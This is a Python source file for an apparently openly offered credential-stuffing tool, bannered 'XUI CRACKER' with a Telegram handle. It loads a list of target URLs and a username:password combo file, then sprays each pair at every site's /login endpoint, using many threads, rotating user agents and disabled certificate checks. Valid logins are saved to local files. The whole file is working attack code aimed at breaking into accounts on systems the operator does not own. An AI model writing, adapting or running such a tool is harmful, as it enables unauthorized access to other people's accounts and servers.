import requests
import threading
import concurrent.futures
from pystyle import Colors, Colorate, Center
from colorama import Fore, init
from os import system, name
import random
import json

init()

g = Fore.GREEN
r = Fore.RED
w = Fore.WHITE
re = Fore.RESET

class C:
    def __init__(self, u, c, t, to):
        self.u = u
        self.c = c
        self.l = threading.Lock()
        self.ul = []
        self.cl = []
        self.gd = []
        self.t = t
        self.to = to
        self.ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/89.0.4389.82 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/88.0.4324.150 Safari/537.36"
        ]

    def lu(self):
        try:
            with open(self.u, "r") as f:
                self.ul = [i.strip().rstrip("/") for i in f if i.strip()]
        except:
            print(f"{r}URL file not found!{re}")
            exit(1)

    def lc(self):
        try:
            with open(self.c, "r") as f:
                self.cl = [i.strip().split(":") for i in f if ":" in i]
        except:
            print(f"{r}Combo file not found!{re}")
            exit(1)

    def run(self):
        self.lu()
        self.lc()
        print(f"{w}Testing {len(self.ul)} URLs with {len(self.cl)} combos using {self.t} threads & timeout {self.to}s{re}\n")
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.t) as e:
                e.map(self.chk, self.ul)
        except KeyboardInterrupt:
            print(f"\n{r}Exiting...{re}")
            return

        self.clr()
        self.bnr()
        if self.gd:
            print("Good Logins Found:\n")
            with open("all-good.txt", "w") as f:
                for i in self.gd:
                    print(i)
                    f.write(i + "\n")
        else:
            print("No Good Logins Found.")

    def chk(self, u):
        l = f"{u}/login"
        for us, pw in self.cl:
            h = {
                "User-Agent": random.choice(self.ua),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json",
                "Connection": "keep-alive",
                "Cookie": "lang=en-US"
            }
            d = {"username": us, "password": pw, "twoFactorCode": ""}
            try:
                r = requests.post(l, headers=h, json=d, timeout=self.to, verify=False)
                j = json.loads(r.text)
                if j.get("success") is True and j.get("msg") == "Login Successfully":
                    print(f"{g}[Good]{re}     {u} -> {us}:{pw}")
                    with self.l:
                        with open("valid-logins.txt", "a") as f:
                            f.write(f"{u} -> {us}:{pw}\n")
                        self.gd.append(f"{u} -> {us}:{pw}")
                    return
                else:
                    print(f"{r}[Not Good]{re} {u} -> {us}:{pw}")
            except:
                continue

    def clr(self):
        system("cls" if name == "nt" else "clear")

    def bnr(self):
        b = '''
▗▖  ▗▖▗▖ ▗▖▗▄▄▄▖     ▗▄▄▖▗▄▄▖  ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▖ 
 ▝▚▞▘ ▐▌ ▐▌  █      ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌
  ▐▌  ▐▌ ▐▌  █      ▐▌   ▐▛▀▚▖▐▛▀▜▌▐▌   ▐▛▚▖ ▐▛▀▀▘▐▛▀▚▖
▗▞▘▝▚▖▝▚▄▞▘▗▄█▄▖    ▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▌ ▐▌

                 t.me/secabuser
'''
        print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(b)))

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    system("cls" if name == "nt" else "clear")
    c = C("", "", 30, 8)
    c.bnr()
    uf = input(f"{w}URL file > {re}").strip()
    cf = input(f"{w}Combo file > {re}").strip()
    try:
        t = int(input(f"{w}Max workers > {re}").strip())
        to = float(input(f"{w}Timeout > {re}").strip())
    except:
        print(f"{r}Invalid input!{re}")
        exit(1)

    c.clr()
    c.bnr()
    c.u = uf
    c.c = cf
    c.t = t
    c.to = to
    c.run()
